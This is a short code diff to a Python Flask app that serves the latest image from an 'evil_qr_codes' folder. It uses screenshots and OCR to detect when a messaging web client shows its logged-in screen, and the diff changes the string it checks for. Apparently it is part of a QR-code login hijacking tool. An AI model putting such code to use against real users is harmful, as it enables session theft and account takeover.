@@ -13,7 +13,7 @@ app = Flask(__name__)
 
 render_xyz = False
 
-# Function to get the latest QR code
+
 def get_latest_qr_code():
     qr_code_dir = "evil_qr_codes"
     qr_code_files = glob.glob(os.path.join(qr_code_dir, "*.png"))
@@ -24,11 +24,11 @@ def get_latest_qr_code():
 
 
 def check_strings_in_screenshot(strings_to_check):
-    # Capture a specific region of the screen where the QR code is expected to appear
+
     x, y, width, height = 0, 0, 800, 600
     screenshot = pyautogui.screenshot(region=(x, y, width, height))
 
-    # Perform OCR to extract text from the screenshot using pyocr
+    
     tools = pyocr.get_available_tools()
     if len(tools) == 0:
         print("No OCR tool found. Install Tesseract OCR.")
@@ -49,7 +49,7 @@ def check_strings_in_screenshot(strings_to_check):
 
 def background_check():
     global render_xyz
-    strings_to_check = ["Archived"]  # Replace this with the actual string to check
+    strings_to_check = ["Search or start new chat"]  
     while True:
         if check_strings_in_screenshot(strings_to_check):
             render_xyz = True
